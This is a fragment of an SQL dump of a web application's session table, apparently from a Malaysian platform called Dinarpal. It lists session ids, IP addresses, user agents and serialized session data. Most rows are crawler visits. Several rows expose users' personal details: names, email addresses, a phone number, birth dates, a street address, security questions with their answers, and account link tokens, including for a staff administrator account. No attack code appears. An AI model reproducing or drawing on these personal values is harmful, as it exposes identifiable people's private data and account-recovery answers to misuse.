verification.";s:9:"logged_in";b:1;}'),
('0d8e300c7e01e12722a2ccc0f75177a3', '183.171.26.30', 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J700', 1461514696, ''),
('0dc2470d84db8879d38459c4e0289341', '183.171.173.61', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00I Build', 1461410037, 'a:1:{s:12:"me_id_parent";s:88:"OyMbrINeYYfK3ift8ps74TgR9XCSvrFicz3lE1SRDMf13CBFI-lLT0OKCrwv3z8gxzuZEKPpsIhule67GpVbqg==";}'),
('0dcc42106fe71b91db9b749237119854', '183.171.28.1', 'Mozilla/5.0 (Linux; Android 5.1; Elite 5 Build/LMY', 1461802543, ''),
('0de9302a2bd8536352369add3931a290', '183.171.28.28', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461820903, 'a:53:{s:5:"me_id";s:2:"52";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"AliaAzhar";s:11:"me_lastname";s:9:"AliaAzhar";s:11:"me_username";s:9:"AliaAzhar";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"AliaAzhar";s:14:"me_unique_link";s:32:"e1dc12ebb8e7905acf59d6ae6856f946";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:22:"alia.azhar@outlook.com";s:16:"me_register_date";s:19:"2016-04-28 13:20:59";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"7437f13378fc32cfd346201b2f0aa3e3";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:14:"flash:old:info";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";}'),
('0e33657393cdc0e125b7b431e2e1ec7b', '157.55.39.90', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461596065, ''),
('0e3cb9e3159d3525af965b31cf673486', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;', 1461743136, ''),
('0e51ba8597704ab1441e0e0391ba9911', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461851250, ''),
('0e7109350ac0d1b1275471570468f87a', '66.249.69.60', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461723309, ''),
('0e8862499129277fa08e403bddc7ca9c', '113.210.62.47', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461423215, ''),
('0ea75b8e45301f7876cec918bc2ae6f1', '66.249.64.91', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461806128, ''),
('0eb66b7d929b02cc2fa1aaec40203f0c', '13.92.241.115', 'semanticbot', 1461739124, ''),
('0eed04b33bd1d5761a4e99113b6f58a4', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461430341, ''),
('0efb3cd5c1a731a15a771d8c2204e315', '175.143.253.102', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100 Build/', 1461498266, 'a:1:{s:12:"me_id_parent";s:88:"q8J5tdyGJeEP7SZcfKkUlwOkqB7F4a1rTxN7JAi5LC_Cr6sccZqmY_cS0_KRWvN7ooVSIwJ8oaq41_AVwh5Dug==";}'),
('0f0931ec561bd64263ba9c3df273ba19', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461253229, ''),
('0f09901369da16219c1780835873dc69', '220.181.108.180', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461463758, ''),
('0f53f19334c0ae4570f2bb21c5c194d7', '60.169.79.233', '0', 1461269930, ''),
('0f8986daa09e1d03addb0b2808d7e093', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461934173, ''),
('0f9acccb59fa84beb204aebb43a24f4d', '113.210.52.171', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko', 1461679865, ''),
('0f9c29b0fbf42608dabb42218da32bea', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232011, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('0fced7ac8366375d5144177e1c377495', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)', 1461430340, ''),
('0fd02324915a436e69fd447ce94163a0', '180.76.15.163', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461592111, ''),
('0ff318f38614613a8494982075432f5d', '183.171.20.3', 'Mozilla/5.0 (Linux; Android 4.3; R8006 Build/JLS36', 1461414042, 'a:1:{s:12:"me_id_parent";s:88:"U1y9nX7U_5GWJLuuuUX3xQbDSu6jKbITr9-qe2xCuu9s5I76AtlkDnO_pzbwLmIgFFaciwMBs-S2c-mlWlRFEw==";}'),
('100f92570c2b898d9923c0f0bf64f856', '94.24.112.85', 'CATExplorador/1.0beta (sistemes at domini dot cat;', 1461933607, ''),
('10158562bf54c99d8ab8161094470491', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394619, ''),
('1036a62d0441648686ca7e41626f4974', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461924901, ''),
('104f77febb4dc42511a4ff70f26cfffc', '115.164.82.86', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461417063, ''),
('1052fb44588430dc530f3ce1882f370b', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461877726, ''),
('1056638ee3f35f4b1d72b0605ab1e686', '113.210.63.66', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461475197, ''),
('106222e804e9fcec15b3e16bd56ed841', '180.76.15.16', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461505695, ''),
('1078fac5d295942b2d706d5c4bcbf474', '68.180.230.178', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461767132, ''),
('108c4c7a1f59fa6d943a69cf22c200e3', '115.164.59.10', 'WhatsApp/2.12.15/i', 1461486671, 'a:1:{s:12:"me_id_parent";s:88:"2HlTadifZC0YwGovw06wGV1dOAxthoPKnQ-f5afNVakhI49xhBKLIGW1TKcPdx25dVGRQFxUUP7EW1ZaLJv7CQ==";}'),
('109ef768f68dfd7d345682c398c9d22c', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461441469, ''),
('10a1a1b4c045da10aad324c3816384a4', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461741982, ''),
('10a6371d50976e5895b08bba396f9562', '115.164.220.239', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461308597, 'a:50:{s:5:"me_id";s:1:"2";s:8:"me_image";s:36:"007670359b0f05b910f399488e2ffcea.jpg";s:12:"me_firstname";s:3:"asd";s:11:"me_lastname";s:3:"dsa";s:11:"me_username";s:3:"asd";s:11:"me_question";s:9:"Who am I?";s:9:"me_answer";s:12:"Jack Sparrow";s:14:"me_unique_link";s:32:"7815696ecbf1c96e6894b779456d330e";s:11:"me_address1";s:0:"";s:8:"me_city1";s:0:"";s:9:"me_state1";s:0:"";s:12:"me_postcode1";s:0:"";s:11:"me_country1";s:0:"";s:11:"me_address2";s:0:"";s:8:"me_city2";s:0:"";s:9:"me_state2";s:0:"";s:12:"me_postcode2";s:0:"";s:11:"me_country2";s:0:"";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:3:"123";s:13:"me_birth_date";s:10:"1998-10-02";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:11:"facebok asd";s:10:"me_twitter";s:12:"twitter saya";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:16:"umar@tuffah.info";s:16:"me_register_date";s:19:"2014-12-13 19:45:41";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-21T10:41:56+08:00";s:12:"me_magic_num";s:32:"ec623adec13773d99685c93053d3228e";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('10a8f03f7d32a77e30ecbf885d6a31ac', '208.115.113.93', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461125885, ''),
('10bc2a449b04407aa46aa44b14661e78', '180.76.15.135', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461713312, ''),
('10cc6427af8928defb22d88ae0b0807c', '184.105.247.195', '0', 1461641979, ''),
('10d8a4a5e93fa890e545fc9deb2e268d', '180.76.15.23', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461160093, ''),
('10f8613f92ac7b89e984897761a5ba36', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461637934, ''),
('10fcd5b4b2cbe46334d8efe0671712db', '80.82.65.82', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)', 1461655018, ''),
('112fb4a06c7a2007521b694085ced8f3', '62.210.148.247', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461938227, ''),
('113bf3785bd72cbb7abdb0cf14210350', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461676556, ''),
('1175fa040277c7652ed1daedbc92ae4f', '157.55.39.62', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461475107, ''),
('1179428b1e8a26ac2976c1f1605617d4', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461563307, ''),
('1184b32acb6f97484aa0df8b84a7a187', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461878442, ''),
('120514487fa94556821aaa7649ff2b46', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461407126, ''),
('120576c526a2abad7f22456ccd6349a6', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461881725, ''),
('121abf99ada25d13b7893bebb49f326a', '91.209.51.22', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461154908, ''),
('121b0ce5c2f12069c749200864f35305', '45.55.229.99', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1', 1461718313, ''),
('1225e81211d0c75ef19309bc58d1214c', '69.30.213.138', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461779723, ''),
('1234c736e6bc8da807a3ee093770bd81', '164.132.161.55', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461567173, ''),
('12791ef6ed3d61b2c023847a59a5c278', '180.76.15.152', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461665659, ''),
('1333f3911e4b9ad26b16232fefc81a4e', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461883286, ''),
('133c25d08ac8372617e115ed593ff437', '113.210.54.28', 'Microsoft Office PowerPoint 2013', 1461135640, ''),
('1347f3fef108c59b7f2b95f6dafafab9', '66.249.66.69', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461917433, ''),
('1362eb5e97c687322608242529f9ab08', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461788800, ''),
('137ea4d58922f6fb30e038f405dd5c87', '66.249.64.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797699, ''),
('13a0cf5d58b4890fde241ea40dde78a7', '211.0.154.125', 'Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100', 1461143750, ''),
('13b2c2ea8a2601eb14d21b95f74c6677', '66.249.64.96', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461825462, ''),
('14005f62f80befa98f4e801d912edd13', '183.171.30.94', 'Mozilla/5.0 (Linux; Android 6.0.1; HTC One_E8 Buil', 1461472511, ''),
('146183b8f3e8a7ae8fdb0320b7182fff', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461770398, ''),
('1469a8c5e2e00baeee9398630db3e8fe', '66.249.66.112', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461932579, ''),
('1470a6cc81a13ad9c2b541278568b935', '40.77.167.45', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461258645, ''),
('150f367bba907d09f422e57a1537ab4b', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461493299, 'a:52:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T14:51:33+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";}'),
('151d385f25fdb77a015481a755ad6dc2', '133.242.52.175', '0', 1461680807, ''),
('1532d8ddd16685ad9ff818dd62398a03', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461478345, ''),
('153df86bd763c696eccb1917983451e3', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461739892, ''),
('1542a69b83b1572c84ec171b0249b490', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;', 1461934175, ''),
('15be76a1ca6e6cf86db5f74f77ac3ee3', '203.82.80.34', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461635638, ''),
('15d3cc3f70849b338617edabc76632b0', '130.193.51.10', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247721, ''),
('15e5ad3905543a77e7261a366b042b8b', '103.1.71.178', 'WhatsApp/2.16.13 A', 1461232765, 'a:1:{s:12:"me_id_parent";s:88:"vG-FKqR3eKBqFS4rGK-GfXf-rNVUU1ABy6_OEzLclcogltS_bu4P-XFexqnk_JIyf96cvrrxaXqvpe5d0LusEA==";}'),
('1608cc1fc6e8926c2c6d92911727d0d3', '175.136.140.216', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/53', 1461914158, ''),
('161d419e88aa505cf53a4e69fb9bb8c5', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461296480, ''),
('1689d80ea97784b29732f9781c73aa23', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461170775, ''),
('16a56286245ba6c179fe0aef48f1cd32', '115.164.84.57', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-A310F Build/', 1461486981, 'a:53:{s:5:"me_id";s:2:"38";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:7:"adleefx";s:11:"me_lastname";s:7:"adleefx";s:11:"me_username";s:7:"adleefx";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:7:"adleefx";s:14:"me_unique_link";s:32:"ddd509ac76d2ff1bb4332edad9443f11";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:17:"adleefx@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 16:35:28";s:15:"me_account_type";s:1:"2";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"b6dda70100517d946bb0811b45bd205c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:17:"Onlinebiz Trading";s:10:"me_reg_num";s:5:"MY123";s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";}'),
('16b2dcde0b44bfa011c320722ddbe64c', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;', 1461934173, ''),
('16c73b23c3dfd314501e46b68f72426e', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461525534, ''),
('16fcb937166c020dd93aa849fed49ee0', '13.92.241.115', 'semanticbot', 1461739123, ''),
('1732e924b7752c2d3e0b5ba6cc6de50d', '14.1.198.216', 'Mozilla/5.0 (Linux; Android 5.0.2; ASUS_Z010D Buil', 1461498381, 'a:1:{s:12:"me_id_parent";s:88:"kx_LflT4R3bXwriLKjr1CtP5EOLsZpIvDa9jQSoB5U5aDh3z2QNmg1fiaDMPwv-X1hvFKwcbS3c55-CLlCTVuw==";}'),
('176a6fca2a1a600287573845275e998e', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1460052517, ''),
('177626d2d20ebd64fd836936ba106aff', '180.76.15.30', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461616343, ''),
('1776618e4c317c32d242cba961d8da0b', '115.164.85.219', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461641435, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T00:41:09+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('178128124682e6dfd07251d18eafce10', '183.171.170.64', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-G750F Build/', 1461420830, ''),
('17d0bd8bc6733f2b3d26f6dcb494094f', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461527321, ''),
('17fc145c4cb8b65711e9b39a41d206a1', '40.77.167.105', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461801165, ''),
('186e394293889619f6697fc0eb5d115e', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160573, ''),
('18d7dc7188797ffeb73831d5959a8688', '157.55.39.182', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461303304, ''),
('18f38d30b421edfcc13d9c2eed09de02', '203.106.151.206', 'Mozilla/5.0 (Linux; Android 4.2.1; Lenovo S920_ROW', 1461550889, 'a:1:{s:12:"me_id_parent";s:88:"mLMoIdQ--rsD6ln2zn5f17iDw98GB-vBS1LCEbUR66-4nPmY5oyBQ4dTL2-1Ubm_uqE461MjBK6J4EScNdhHxg==";}'),
('19106c29ad75873f42ae0c8819582dc6', '103.1.71.178', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461232728, 'a:2:{s:12:"me_id_parent";s:88:"H8qnHJ_skzAJfA1Lfy-szgWWwjAqpJSazh7034AyOjyg3qfd17Jb686eRJphrjM9f756S7bV6kUJM0l6764AbQ==";s:15:"flash:old:error";s:24:"Wrong username/password!";}'),
('191614e6dc6f844cf05fbcd04e6dedbe', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461317842, ''),
('1928ab8e81ae7145dc84bdbb9e1003f8', '113.210.57.165', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461420959, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('192b1f31f825b63970867f689f343988', '66.249.71.194', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461226887, ''),
('193f43b81ff345bfcde9efb973bd9cb5', '175.136.237.209', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (', 1461215050, ''),
('194547d752c685948b28229812d940af', '115.164.81.230', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461853829, 'a:51:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-28T22:08:52+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('1950ae045ee916a0242d84360ddd5839', '66.249.77.7', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461192089, ''),
('1985a2c440230e1cc4388a145b1038a6', '111.221.44.11', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z008D Build/', 1461427897, 'a:1:{s:12:"me_id_parent";s:88:"vjbdcmd-a3P2coIwJxuJL6-O0elUW7KiTYMDP4-rUYUeJCJ1NbUmINvkNQOGVoB1jnvTfu4Ru8g8br8yqaoxEg==";}'),
('198b6e1781f93aa7f875d0c97a0b10f6', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461878096, ''),
('198cb37d752d0c00a9517a98e0cfb8f1', '66.249.64.46', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797840, ''),
('19b4c96f3d1774aafe08dbc25dff13bd', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232004, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('19cb27bfbb7330b949a70f300d2ad0b6', '66.249.66.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461922415, ''),
('19d963b5d49e395a45b8d056702d4120', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892139, ''),
('19e31d2c3c74d7eb3bfdda20a57514a0', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461588126, ''),
('19f1b73a1006c484dd7180a24676cf22', '210.195.147.202', 'Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S939 Bui', 1461470275, 'a:1:{s:15:"flash:old:error";s:15:"Invalid E-mail!";}'),
